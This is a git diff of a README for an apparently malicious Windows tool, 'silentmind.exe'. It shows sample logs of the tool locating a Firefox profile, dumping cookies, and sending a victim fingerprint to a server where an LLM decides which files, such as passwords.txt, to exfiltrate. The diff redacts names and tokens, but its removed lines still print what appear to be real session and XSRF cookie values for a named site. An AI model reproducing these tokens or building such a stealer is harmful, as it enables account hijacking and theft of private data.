@@ -106,14 +106,6 @@ silentmind.exe
 # OpenAI API Configuration
 OPENAI_API_KEY=your_openai_api_key_here
 
-# Server Configuration
-SERVER_HOST=0.0.0.0
-SERVER_PORT=8000
-
-# LLM Configuration
-OLLAMA_URL=http://localhost:11434/api/generate
-OLLAMA_MODEL=mistral
-OPENAI_MODEL=gpt-3.5-turbo
 ```
 
 ### Client Configuration
@@ -156,28 +148,28 @@ HINTERNET hConnect = InternetConnect(hSession, "192.168.1.12", 8000, NULL, NULL,
 
 **Step 1: Profile detection**
 ```
-[+] Found Firefox profile: C:\Users\FarisFisal\AppData\Roaming\Mozilla\Firefox\Profiles\6vnwghj5.default-release
+[+] Found Firefox profile: C:\Users\TestUser\AppData\Roaming\Mozilla\Firefox\Profiles\6vnwghj5.default-release
 [+] Found cookies.sqlite database
 ```
 
 **Step 2: Cookie extraction and formatting**
 ```
 === FIREFOX COOKIES ===
-Database: C:\Users\FarisFisal\AppData\Roaming\Mozilla\Firefox\Profiles\6vnwghj5.default-release\cookies.sqlite
+Database: C:\Users\TestUserX\AppData\Roaming\Mozilla\Firefox\Profiles\6vnwghj5.default-release\cookies.sqlite
 
 Cookie #1:
-  Domain: .cybertalents.com
+  Domain: .example.com
   Name: XSRF-TOKEN
-  Value: eyJpdiI6IjUvU05PNEJObzZoSWtIYmFUeHlnaHc9PSIsInZhbHVlIjoiN1R1Mjg4T0wwNlhzRmpIVTRYWGd2MzMwLzVIYmhremhUemtHV1Qwa1AwU2RiK1RPOXFKbWFFd0QvY0U0SVRlNm5ML3EyMWNhTkptMkZSQWlkS2Y5WTR6bDhmOFdpNWVmNTBKbUhMaHBjeDRxSVVuNVhrcngrK20zTjJjRVJvUUwiLCJtYWMiOiI0Mzc4OThjOTk0ZjJlNzg2MTA0OTU4MzY1YmQ1M2JlOTZjZGNkZjg2YjYyNTIyNzYxMjFlZmQzZDQ2ZjNkZTc0IiwidGFnIjoiIn0%3D
+  Value: eyJpdiI6IjUvU05PNEJObzZoSWtIYmFUeHlnaHc9PSIsInZhbHVlIjA0OTU4MzY1YmQ1M2JlOTZjZGNkZjg2YjYyNTIyNzYxMjFlZmQzZDQ2ZjNkZTc0IiwidGFnIjoiIn0%3D
   Path: /
   Expires: 1757319429160
   Secure: 1
   HttpOnly: 0
 
 Cookie #2:
-  Domain: .cybertalents.com
-  Name: cybertalents_session
-  Value: eyJpdiI6InlTeTc1dGRUUFJjYlZ3dk5ZWEROZ2c9PSIsInZhbHVlIjoiWU9RbXRIRS84eEJOTkJWWGdEV25GaVV6ZVBNdWd5S1JmUzVBNENCakRQSStWZTUxNUdiZVU0bm9TSi9qZG1wajJLdzY3TXFvYVFHYzNXYjlkcmtqZWxjM0VacG5Zcmx0N2tXSE1Rd3pwYzh2c3ZlMEptd0N4dnRNcU9JdHNSTnAiLCJtYWMiOiI1YTE1OTNhNWZkNzhmMmFlYTBjMWM2NDM2MzcwZjY0M2M4NDNmYzk3NTk4MTNlOTNkMjA0OTU0OGE1ZDllYzk3IiwidGFnIjoiIn0%3D
+  Domain: .example.com
+  Name: cyberX_session
+  Value: eyJpdiI6InlTeXXX4NDNmYzk3NTk4MTNlOTNkMjA0OTU0OGE1ZDllYzk3IiwidGFnIjoiIn0%3D
   Path: /
   Expires: 1757319429160
   Secure: 1
@@ -190,7 +182,7 @@ Cookie #2:
 ```
 == [DECISION API HIT] ==
 HEADERS: Content-Type: application/json
-RAW BODY: {"fingerprint": {"user": "FarisFisal", "host": "DESKTOP-56RMILU", "os": "Windows"}, "files": [...]}
+RAW BODY: {"fingerprint": {"user": "FarisFisalXXX", "host": "DESKTOP-XXXX", "os": "Windows"}, "files": [...]}
 [LLM DECISION RAW]: {"exfiltrate": ["passwords.txt"], "reasons": {...}}
 ```
 
